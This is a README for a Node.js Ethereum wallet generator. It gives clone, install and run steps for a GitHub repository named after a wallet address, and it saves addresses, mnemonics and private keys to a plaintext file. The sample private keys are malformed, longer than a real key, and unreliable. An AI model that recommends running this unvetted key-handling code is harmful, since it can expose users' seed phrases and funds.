# Generate ETH wallet using Node js 
Generate an Ethereum wallet using node, we can use the ethers.js library.

This library provides a simple and powerful way to interact with the Ethereum blockchain, including the generation of wallets. 

This code generates secure Ethereum wallets with the key information needed to manage and recover them. 

The generated wallet details are stored in an array and then written to the file in a formatted manner. 

After generating all the wallets, the script saves the address, mnemonic, and private key for each wallet to wallet.txt file.
## Installation:
### First download ETH wallet Generator or clone it
1. Clone the repository: **`git clone https://github.com/mascrypt0/0xbaae099935769FD77FF21dFf915765f71BA71970.git`**
2. Navigate to the project directory: **`cd 0xbaae099935769FD77FF21dFf915765f71BA71970`**
3. Install dependencies: **`npm install`**
4. If you facing any error try to install dependencies manually

```bash
npm install ethers
```
```bash
npm install readline-sync
```

Start the project: 
```bash
node index.js
```

You may use this project as desired

### How It Works: ###
The ethers.Wallet.createRandom() function generates a random Ethereum wallet with a public address, mnemonic (12-word seed phrase), and private key.

The script asks the user how many wallets to generate and outputs the address, mnemonic, and private key for each wallet.

The program loops through generating the requested number of wallets, displaying the results in the console.

After generating the wallets, the user is prompted to either generate more wallets or exit.

Output Example:
bash
Copy code
----- Ethereum Wallet Generator -----
How many wallets would you like to create? 2

Generating 2 wallet(s)...

Wallet 1:
- Address: 0x2bFe238aEb21A580B5bA40D5F5401b407856d2c9
- Mnemonic: purpose frost parrot meadow worry tail cage vehicle maple mechanic fox razor
- Private Key: 0xabcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
-----------------------------
Wallet 2:
- Address: 0x3D7e3c2A30B8aCFCDf6b9732aFC61238e8F04191
- Mnemonic: cliff artist quality broken panda frame myth jelly bounce rocket enjoy toe
- Private Key: 0x123456abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789
-----------------------------
Do you want to generate more wallets? (yes/no): no
Exiting... Goodbye!
This code generates secure Ethereum wallets with the key information needed to manage and recover them. Make sure to securely store the private key and mnemonic!
